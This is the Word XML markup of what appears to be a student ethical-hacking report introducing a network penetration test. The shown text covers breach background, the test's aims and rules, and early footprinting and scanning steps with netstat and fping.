          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EC0236" w14:textId="77777777" w:rsidR="00C5090A" w:rsidRDefault="00C5090A">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:sectPr w:rsidR="00C5090A" w:rsidSect="00C5090A">
          <w:footerReference w:type="default" r:id="rId10"/>
          <w:footerReference w:type="first" r:id="rId11"/>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="299"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="611D7A3A" w14:textId="77777777" w:rsidR="001905B9" w:rsidRDefault="00341658" w:rsidP="00C5090A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc27518391"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="42E6EE25" w14:textId="77777777" w:rsidR="00341658" w:rsidRDefault="00341658" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc27518392"/>
      <w:r>
        <w:t>Background</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="304ACA93" w14:textId="77777777" w:rsidR="004E4628" w:rsidRDefault="006D767D" w:rsidP="006D767D">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="919"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Keeping a </w:t>
      </w:r>
      <w:r w:rsidR="000F6373">
        <w:t>company’s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> network out </w:t>
      </w:r>
      <w:r w:rsidR="000F6373">
        <w:t xml:space="preserve">of malicious hands should be at the forefront of </w:t>
      </w:r>
      <w:r w:rsidR="00E64585">
        <w:t xml:space="preserve">a company’s security concerns. The most serious threats facing a company </w:t>
      </w:r>
      <w:r w:rsidR="009850CF">
        <w:t xml:space="preserve">today </w:t>
      </w:r>
      <w:r w:rsidR="00E64585">
        <w:t xml:space="preserve">are no longer other companies out doing them in their chosen area of business, it is a company being </w:t>
      </w:r>
      <w:r w:rsidR="009850CF">
        <w:t xml:space="preserve">torn apart limb by limb from the inside by an external malicious group or individual tampering with the internal systems of the company. From the late 2000s </w:t>
      </w:r>
      <w:r w:rsidR="009C3F5D">
        <w:t xml:space="preserve">the most serious loss for companies wasn’t profits or lack of growth, it was large databases full of users details that, when exposed to the internet, saves hackers the bother of finding certain personal details, as well as passwords. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404A27AB" w14:textId="77777777" w:rsidR="004E4628" w:rsidRDefault="004E4628" w:rsidP="006D767D">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="919"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77E0A2C9" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="009C3F5D" w:rsidP="006D767D">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="919"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The financial impact of these “data leaks” can </w:t>
      </w:r>
      <w:r w:rsidR="004E4628">
        <w:t xml:space="preserve">extend into the tens of </w:t>
      </w:r>
      <w:r w:rsidR="004B786F">
        <w:t>millions</w:t>
      </w:r>
      <w:r w:rsidR="004E4628">
        <w:t xml:space="preserve"> of pounds range. In July 2018, British Airways was fined £180 million for a data breach. That amount of money is more than enough to buy a new Airbus a321 neo. A clone of the British Airways website was created, and users were then directed to it. This meant when users were booking a flight several items of data protected by GDPR laws and numerous international laws are transacted into British Airways systems, not the least of which are passports, that include numerous amounts of unique information that can be used </w:t>
      </w:r>
      <w:r w:rsidR="00A52896">
        <w:t>in many malicious ways by people seeking to replicate the accounts and personal details of an actual person. Unfortunately for British Airways, GDPR laws which came into effect in 2017 were used to full extent and the maximum fine possible was imposed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD1E6C9" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="006D767D">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="919"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251677696" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="67176441" wp14:editId="076E0768">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>1060424</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>295910</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3124200" cy="2677049"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="39" name="Picture 39"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e the source imag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24200" cy="2677049"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="004956A5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251679744" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="231EC293" wp14:editId="6E1B582B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2912034</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3569335" cy="401955"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTopAndBottom/>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9335" cy="402336"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="28FE9BAD" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004956A5">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>Fig</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>- 1 European and UK GDPR laws are identical (at time of writing). This infomercial displays the penalty for failing to adhere to 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31EC293" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                <v:stroke joinstyle="miter"/>
                <v:path gradientshapeok="t" o:connecttype="rect"/>
              </v:shapetype>
              <v:shape id="Text Box 2" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:229.3pt;width:281.05pt;height:31.65pt;z-index:2516797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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="28FE9BAD" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004956A5">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>Fig</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>- 1 European and UK GDPR laws are identical (at time of writing). This infomercial displays the penalty for failing to adhere to it.</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="328FB145" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="006D767D">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="919"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D906E78" w14:textId="77777777" w:rsidR="006D767D" w:rsidRDefault="000B4703" w:rsidP="006D767D">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="919"/>
      </w:pPr>
      <w:r>
        <w:t>The best way to protect against such losses is to conduct a penetration test of the network in question. A professional penetration tester will follow a methodology that will include several phases. They are</w:t>
      </w:r>
      <w:r w:rsidR="00A1426B">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A1426B">
        <w:t>in a simple fashion:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Foot-printing,</w:t>
      </w:r>
      <w:r w:rsidR="00A52896">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">scanning, enumeration and hacking. </w:t>
      </w:r>
      <w:r w:rsidR="00A1426B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004B786F">
        <w:t>However,</w:t>
      </w:r>
      <w:r w:rsidR="00A1426B">
        <w:t xml:space="preserve"> each phase consists of several stages, in order for the penetration test to examine every possible avenue an attacker might to take</w:t>
      </w:r>
      <w:r w:rsidR="00B91CCA">
        <w:t xml:space="preserve">. Foot printing may include anything from doing some internet research to gathering samples of packets travelling in and out of the network, scanning may involve several command line tools to look at passively or directly interface with the network. </w:t>
      </w:r>
      <w:r w:rsidR="003B1D7B">
        <w:t>Enumeration focuses on close analysis of any irregularities scanning detected and if there is any possible way to exploit a prospective vulnerability. After some further scanning and more enumeration finally exploits are attempted against the vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EAD998" w14:textId="77777777" w:rsidR="004D7B3D" w:rsidRDefault="004D7B3D" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24AA7A8E" w14:textId="77777777" w:rsidR="00CB57D5" w:rsidRDefault="004D7B3D" w:rsidP="004B7E63">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc27518393"/>
      <w:r>
        <w:t>Aim</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="3B2C675D" w14:textId="77777777" w:rsidR="00CB57D5" w:rsidRDefault="003B1D7B" w:rsidP="00CB57D5">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This paper aims to show how secure the target network </w:t>
      </w:r>
      <w:r w:rsidR="008C481C">
        <w:t xml:space="preserve">is through a full penetration test following a professional ethical hacking methodology. This includes following a series of phases where the target network was subject to a series of enquiries and scans, enumeration of these results and finally penetration of the network. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31862318" w14:textId="77777777" w:rsidR="00F4502A" w:rsidRDefault="00F4502A" w:rsidP="00CB57D5">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>The paper aims to guide the user through a procedure designed to breach parts of a network generally inaccessible by conventional means. This will require the user to first do some aspect of foot printing the target. This includes discovering the current version of operating syste</w:t>
      </w:r>
      <w:r w:rsidR="000A152D">
        <w:t xml:space="preserve">ms installed and running on the target systems, to expose any possible vulnerabilities present on these systems. Once this is completed scanning should be performed to ensure every aspect of the system has been looked at for any possible </w:t>
      </w:r>
      <w:r w:rsidR="004B4C81">
        <w:t xml:space="preserve">details such as other operating systems, architecture </w:t>
      </w:r>
      <w:r w:rsidR="0000119F">
        <w:t xml:space="preserve">and services that are running. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FD0E10" w14:textId="77777777" w:rsidR="004956A5" w:rsidRDefault="004956A5" w:rsidP="00CB57D5">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Whilst it is expected </w:t>
      </w:r>
      <w:r w:rsidR="00CE73D7">
        <w:t>some</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> approaches </w:t>
      </w:r>
      <w:r w:rsidR="00CE73D7">
        <w:t>into this may not work, the main goal is to access the admin account in an ethical way. As such, unethical approaches such as extortion and holding private data for ransom are explicitly not allowed. Any personal data found must be kept private and not shared with anyone. Once the admin account has been accessed, suitable proof of this must be documented and the overall security of the network assessed, so that suggestions and attempts can be made as to mitigate the issues present</w:t>
      </w:r>
      <w:r w:rsidR="00A0250F">
        <w:t xml:space="preserve"> in the best possible way.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64113415" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc27518394"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="0307F349" w14:textId="77777777" w:rsidR="008C481C" w:rsidRPr="00A0250F" w:rsidRDefault="009525A9" w:rsidP="00A0250F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc27518395"/>
      <w:r>
        <w:t>Overview of Procedure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="630CDFFB" w14:textId="77777777" w:rsidR="008C481C" w:rsidRDefault="00CE73D7" w:rsidP="00CE73D7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The procedure aims to follow an Ethical way of Hacking into a network to survey its security. This will include the standard methodology of foot printing, scanning, vulnerability scanning, enumeration and hacking. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF97D51" w14:textId="77777777" w:rsidR="00CE73D7" w:rsidRDefault="00CE73D7" w:rsidP="00CE73D7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21499B2B" w14:textId="77777777" w:rsidR="00CE73D7" w:rsidRPr="005206F7" w:rsidRDefault="00CE73D7" w:rsidP="00CE73D7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>Kali Linux and a Windows machine were used to conduct this penetration test as the tools used to gain access to the network are particular to a certain type of operating system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD27526" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67E4F2F1" w14:textId="77777777" w:rsidR="004D7B3D" w:rsidRDefault="00E72EC2" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc27518396"/>
      <w:r>
        <w:t>Footprinting</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5548F3F9" w14:textId="77777777" w:rsidR="004D7B3D" w:rsidRDefault="00C84540" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Full </w:t>
      </w:r>
      <w:r w:rsidR="00DE5D7D">
        <w:t>foot printing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was not </w:t>
      </w:r>
      <w:r w:rsidR="00DE5D7D">
        <w:t>necessary</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as the pen tester was given an </w:t>
      </w:r>
      <w:r w:rsidR="00DE5D7D">
        <w:t>account</w:t>
      </w:r>
      <w:r w:rsidR="00727FDF">
        <w:t>, however;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC46AED" w14:textId="77777777" w:rsidR="00261D49" w:rsidRDefault="00727FDF" w:rsidP="00261D49">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>The Servers IP addresses were searched on the internet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C46ED47" w14:textId="77777777" w:rsidR="00261D49" w:rsidRDefault="00727FDF" w:rsidP="00727FDF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Display DNS was used to show the DNS names and status of both the servers </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180974EB" w14:textId="77777777" w:rsidR="006E72FA" w:rsidRDefault="00E72EC2" w:rsidP="006E72FA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc27518397"/>
      <w:r>
        <w:t>Scanning</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="3DD710B8" w14:textId="77777777" w:rsidR="006E48D6" w:rsidRDefault="00FF7CAE" w:rsidP="00CE73D7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="001E3C1D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Netstat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was used to detect active connections the client had with the network</w:t>
      </w:r>
      <w:r w:rsidR="00CE73D7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CD05F3">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="006E48D6">
        <w:t>nd find active connections</w:t>
      </w:r>
      <w:r w:rsidR="00CE73D7">
        <w:t xml:space="preserve">. This was done </w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t xml:space="preserve">as its native to Windows and Linux and is a command line tool used to display active connections. </w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">netstat -a </w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t>was used to display all connections and listening ports. (See Fig - 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA94944" w14:textId="77777777" w:rsidR="006E48D6" w:rsidRDefault="006E48D6" w:rsidP="006E48D6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A125080" wp14:editId="1BA7011D">
            <wp:extent cx="4438177" cy="1009290"/>
            <wp:effectExtent l="0" t="0" r="63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4871" r="4829" b="79608"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4491122" cy="1021330"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6CC185" w14:textId="77777777" w:rsidR="00CD05F3" w:rsidRDefault="00CD05F3" w:rsidP="00E15F8D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="70E27B5E" wp14:editId="3BA3AA14">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>88569</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2665095" cy="292735"/>
                <wp:effectExtent l="0" t="0" r="1905"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5095" cy="292735"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="4FADADC1" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>Fig</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> 2</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> – Netstat being used to find active connections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E27B5E" id="_x0000_s1027" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:6.95pt;width:209.85pt;height:23.05pt;z-index:2516623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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="4FADADC1" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>Fig</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> 2</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> – Netstat being used to find active connections</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A48E30F" w14:textId="77777777" w:rsidR="00E15F8D" w:rsidRDefault="00E15F8D" w:rsidP="00E15F8D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="693B84D2" w14:textId="77777777" w:rsidR="00E15F8D" w:rsidRDefault="00E15F8D" w:rsidP="00E15F8D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B636C58" w14:textId="77777777" w:rsidR="00FF7CAE" w:rsidRDefault="00FF7CAE" w:rsidP="00FF7CAE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="001E3C1D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fping</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was used</w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t xml:space="preserve"> in Kali</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to detect </w:t>
      </w:r>
      <w:r w:rsidR="00F901F4">
        <w:t xml:space="preserve">what machines were running in the </w:t>
      </w:r>
      <w:r w:rsidR="001E3C1D">
        <w:t>network and behaves very similar to Windows Ping utility. The command to fping can be seen in Fig - 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20402FB5" w14:textId="77777777" w:rsidR="00E15F8D" w:rsidRDefault="00E15F8D" w:rsidP="00E15F8D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="10C08E85" wp14:editId="46284235">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>1197610</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>319405</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2947670" cy="292735"/>
                <wp:effectExtent l="0" t="0" r="5080" b="0"/>
                <wp:wrapTopAndBottom/>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7670" cy="292735"/>
                        </a:xfrm>
